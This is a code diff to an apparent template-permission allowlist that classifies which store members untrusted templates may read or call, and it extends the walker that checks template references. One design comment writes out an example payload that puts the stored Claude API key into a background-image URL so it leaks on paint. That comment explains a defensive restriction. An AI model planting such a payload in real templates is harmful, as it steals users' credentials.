@@ -37,7 +37,7 @@
  * store member fails that test until it is classified, so this cannot quietly fall behind the code
  * it describes — the failure mode an allowlist beside the thing it allows usually has.
  */
-import { markReactive } from '@we/schema-shared';
+import { isExpressionToken, markReactive, parseExpression, referencedPaths } from '@we/schema-shared';
 
 /**
  * What a group of capabilities lets a template do, in the words a person would use.
@@ -119,7 +119,7 @@ const WIRING = 'wiring' as const;
 
 interface MemberSpec {
   group: CapabilityGroup;
-  /** `state` is read through `$store` and tagged reactive; `action` is called through `$action`. */
+  /** `state` is read in expressions and tagged reactive; `action` is called through `$action`. */
   kind: 'state' | 'action';
   /**
    * Irreversible, or expensive to reverse. Not a grant of its own — a flag the host reads to decide
@@ -321,14 +321,14 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       Agent settings and the datasets that hold them.
 
       `agentSettings` carries `claudeApiKey`. Exposed, a template needed one styled element —
-      `bgImage: { $concat: ['https://…?k=', { $store: 'datasetStore.agentSettings.claudeApiKey' }] }`
+      `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
       — to exfiltrate it on paint. Any URL-valued prop is a network channel, so this is not fixable
       by watching for suspicious actions.
 
-      The root/global/marketplace handles go with it, and not only for tidiness: they are what a
-      `$query`'s `dataset` option resolves against, so leaving them reachable would let a template
-      read the same settings the long way round. `agent`-tier surfaces that genuinely need a
-      setting expose it as a named accessor rather than the whole record.
+      The root handle goes with it, and not only for tidiness: it is what a `$query`'s `dataset`
+      option resolves against, so leaving it reachable would let a template read the same settings
+      the long way round. `agent`-tier surfaces that genuinely need a setting expose it as a named
+      accessor rather than the whole record.
     */
     agentSettings: WIRING,
     /*
@@ -338,8 +338,23 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     */
     rootDataset: state('agent'),
     testDataset: WIRING,
-    globalDataset: WIRING,
-    marketplaceDataset: WIRING,
+    /*
+      The global discovery space and the marketplace — shared neighbourhoods holding nothing of this
+      agent's, so nothing here needs the protection `agentSettings` has.
+
+      They were `WIRING` alongside it, on the reasoning above, and that broke two pieces of chrome
+      without anything noticing: the create-space modal reads `globalDataset` to decide whether to
+      offer "list in the global space", and the marketplace shelf queries with
+      `dataset: 'datasetStore.marketplaceDataset'`. Both resolved to nothing — the modal never
+      offered the listing and the shelf's queries had no dataset to run against. The tier-fit test
+      did not see it because it walked neither the slot nodes nor a query's `dataset` path; it walks
+      both now.
+
+      `navigation` because a template already reaches the same space as `globalSpaceId`; `library`
+      because reading the marketplace's listing is the act the library group names.
+    */
+    globalDataset: state('navigation'),
+    marketplaceDataset: state('library'),
     updateAgentSettings: WIRING,
     clearCurrentDataset: WIRING,
     trackDataset: WIRING,
@@ -569,6 +584,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     // container. Creating one is writing a record, which is the same act as posting — so it belongs
     // in the tier every template can reach, beside `spaceStore.createPost`.
     creatableEntities: state('content'),
+    displays: state('content'),
     recordDraft: state('content'),
     recordDraftDirty: state('content'),
     recordErrors: state('content'),
@@ -640,8 +656,14 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     previewThemeScope: action('editor'),
     setThemeScopeGlobal: action('agent'),
     setUseTemplateTheme: action('agent'),
-    restorePersonalTheme: action('library'),
-    clearSpaceTheme: action('space-admin'),
+    /*
+      Host wiring, both: the theme resolver calls them as the agent moves between spaces, and
+      nothing a template could say with them is not already said by applyTheme and clearSpaceThemePin.
+      They were classified as API, which listed them in the reference with a description that had to
+      say "prefer something else" — the tell that a member was constrained rather than designed in.
+    */
+    restorePersonalTheme: WIRING,
+    clearSpaceTheme: WIRING,
     startEditing: action('editor'),
     // The editor tier, with `startEditing` — this is the second half of the same gesture: open the
     // theme editor, and say which role you came for. Nothing a template has any business setting.
@@ -704,8 +726,10 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     publishToSpace: action('library'),
     deleteMarketplaceTemplate: destructive('library'),
     publishToMarketplace: action('library'),
-    isBuiltInTemplate: action('library'),
-    isInstalled: action('library'),
+    // Queries that answer with a value, which $action cannot read: templateManagementList carries
+    // isBuiltIn and isInstalled per row, which is the form a template can use.
+    isBuiltInTemplate: WIRING,
+    isInstalled: WIRING,
 
     /*
       Wiring, and `updateTemplate`/`replaceTemplate` especially.
@@ -788,7 +812,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       These were `WIRING`, on the reasoning that dock geometry is "the host's layout arithmetic,
       driven by a resize handle it owns". The arithmetic is the host's; the handle is not code. Docks
       are built as *schema* by `dockRegistry.dockFrame` — the geometry arrives through
-      `{ $store: 'shellStore.dockGeometry.<id>.<field>' }` and the drag through
+      `{ $: 'shellStore.dockGeometry.<id>.<field>' }` and the drag through
       `{ $action: 'shellStore.beginDockResize' }` — so marking them wiring removed them from every
       bag, chrome's included. Every docked panel rendered as empty space with no resize rail.
 
@@ -980,7 +1004,7 @@ const ALWAYS_PRESENT = new Set([
   '$identities',
   '$ephemeral',
   /*
-    The `$source` registry — computed rows and values a template may draw on.
+    The host-source registry — computed rows and values a template may call on.
 
     Present in every bag for the same reason `$getModel` is: it is a host-provided capability that
     templates are meant to reach, not store state anyone needs protecting from. Its members are pure
@@ -995,13 +1019,13 @@ const ALWAYS_PRESENT = new Set([
 ]);
 
 /**
- * Module stores, with every function tagged so `$store` can still read module state.
+ * Module stores, with every function tagged so an expression can still read module state.
  *
  * **This is deliberately permissive, and the one place the boundary is not yet drawn.** A module's
  * store is a flat record whose members are a mix of raw signals, derived closures and actions, and
  * nothing distinguishes them — so tagging selectively is not possible without the module saying
- * which is which. Tagging all of them keeps `{ $store: 'modules.transcribe.level' }` working and
- * leaves `{ $store: 'modules.call.leave' }` callable during paint, exactly as before.
+ * which is which. Tagging all of them keeps `{ $: 'modules.transcribe.level' }` working and
+ * leaves `modules.call.leave` callable during paint, exactly as before.
  *
  * The reason that is acceptable *today* is that modules are bundled: they are chosen by the
  * deployment's seed and ship with the app, at the same trust level as the app itself. It stops being
@@ -1051,7 +1075,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 
       `moduleStores` is one object the registry mutates in place as modules register and unregister,
       so copying its contents once would freeze the module set at whatever had loaded when this bag
-      was built — and `{ $store: 'modules.notes.open' }` is documented as the way a template depends
+      was built — and `{ $: 'modules.notes.open' }` is documented as the way a template depends
       on an optional module.
     */
     if (key === 'modules') {
@@ -1092,7 +1116,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 
       if (spec.kind === 'state') {
         // Tagged so `walkPath` will call it. Anything untagged is data to the resolver, never
-        // something to invoke — which is what stops a `$store` path from running an action.
+        // something to invoke — which is what stops a store read from running an action.
         filtered[name] = typeof member === 'function' ? markReactive(member) : member;
         continue;
       }
@@ -1130,7 +1154,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
  *
  * Because "resolves to nothing" is invisible. A synced space template referencing
  * `sessionStore.logout` renders a Sign out button that takes the click and does nothing, and a
- * `{ $store: 'runtimeStore.trustedAgents' }` renders an empty list rather than an error — a
+ * `{ $: 'runtimeStore.trustedAgents' }` renders an empty list rather than an error — a
  * template that is quietly half-broken, in a way neither its author nor the person looking at it
  * can see. Reading the references before accepting the template turns a silent hole into a
  * sentence, at install time, naming what it wanted.
@@ -1141,7 +1165,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 export interface SurfaceReference {
   /** The store path as written — `sessionStore.logout`. */
   path: string;
-  /** How it was reached: through `$store` or through `$action`. */
+  /** How it was reached: read in an expression, or called through `$action`. */
   via: 'store' | 'action';
   /** The group it belongs to, or null when the member is not classified at all. */
   group: CapabilityGroup | null;
@@ -1159,6 +1183,20 @@ export interface SurfaceInspection {
 /** Store names the bag always provides, so a reference to one is never blocked. */
 const UNGATED_ROOTS = new Set([...ALWAYS_PRESENT, 'modules']);
 
+/** Roots an expression may start from that are not stores, and so are never classified. */
+const EXPRESSION_ROOTS = new Set([
+  'local',
+  'me',
+  'currentDataset',
+  'event',
+  'arg',
+  'result',
+  'index',
+  'prev',
+  'surface',
+  'item',
+]);
+
 function classify(path: string): { store: string; member: string; spec: Classification | undefined } | null {
   const [store, member] = path.split('.');
   if (!store || !member) return null;
@@ -1166,7 +1204,7 @@ function classify(path: string): { store: string; member: string; spec: Classifi
 }
 
 /**
- * Walk any schema-shaped value, collecting every `$store` and `$action` reference.
+ * Walk any schema-shaped value, collecting every store read in an expression and every `$action`.
  *
  * Structural rather than typed on `SchemaNode`, because references live in props, in nested
  * operator objects, in `$each` items, in route trees and in handler arrays — everywhere. A walk
@@ -1181,8 +1219,35 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
   if (!value || typeof value !== 'object') return;
 
   const node = value as Record<string, unknown>;
-  if (typeof node.$store === 'string') into.push({ path: node.$store, via: 'store' });
   if (typeof node.$action === 'string') into.push({ path: node.$action, via: 'action' });
+  /*
+    An expression names stores as bare paths — `spaceStore.members`, `modules.notes.open`. Every
+    dotted root the expression reads is reported as a store reference; roots that are not stores
+    (`local`, `item`, `me`) are dropped by `classify` below exactly as an ungated store root is,
+    so there is no second list of names to keep in step. A source that does not parse names
+    nothing, which is right: it resolves to nothing at paint too, and the validator is where the
+    syntax error is reported.
+  */
+  if (isExpressionToken(node)) {
+    try {
+      for (const { root, path } of referencedPaths(parseExpression(node.$))) {
+        if (path.length > 0) into.push({ path: [root, ...path].join('.'), via: 'store' });
+      }
+    } catch {
+      // A syntax error is the validator's to report.
+    }
+  }
+  /*
+    A query's `dataset` is a store path too — `dataset: 'datasetStore.marketplaceDataset'` — and the
+    renderer resolves it against the same bag expressions read from. Left out of the walk, a dataset
+    the bag withholds is a query that quietly runs against nothing, which is how the marketplace
+    shelf came to render empty with every check passing. A query object always carries `entity`,
+    which is what tells this apart from any other prop that happens to be called `dataset`; the
+    `$`-prefixed forms (`$currentDataset`) are renderer bindings, not store members.
+  */
+  if (typeof node.entity === 'string' && typeof node.dataset === 'string' && !node.dataset.startsWith('$')) {
+    into.push({ path: node.dataset, via: 'store' });
+  }
 
   for (const entry of Object.values(node)) collectReferences(entry, into);
 }
@@ -1190,7 +1255,7 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
 /**
  * Inspect a template against a set of grants.
  *
- * A `$store` path may be deeper than `store.member` (`spaceStore.currentSpace.name`); only the
+ * A store path may be deeper than `store.member` (`spaceStore.currentSpace.name`); only the
  * first two segments decide access, which is exactly what the bag does — it filters members, and
  * everything below one travels with it.
  */
@@ -1213,7 +1278,19 @@ export function inspectTemplateSurface(schema: unknown, grants: readonly Capabil
     if (UNGATED_ROOTS.has(root)) continue;
 
     const parsed = classify(path);
-    if (!parsed || parsed.spec === undefined || parsed.spec === WIRING) {
+    /*
+      A root that is not a store at all — a `$each` variable, `local`, a name the expression bound.
+      Only an expression can produce one here (a store path always starts with a store), and it
+      is not a reference to anything the surface governs. A *typo'd* store name lands here too, and
+      that is the validator's to report against the known store list, not this walker's — this
+      answers "may you", not "does it exist".
+    */
+    if (
+      !parsed ||
+      (TEMPLATE_SURFACE[parsed.store] === undefined && (EXPRESSION_ROOTS.has(root) || !/Store$/.test(root)))
+    )
+      continue;
+    if (parsed.spec === undefined || parsed.spec === WIRING) {
       // Unclassified or host wiring. Blocked either way — an undecided member is not an open one —
       // but with a null group, so a caller can word "there is no such thing" differently from
       // "you may not have that".
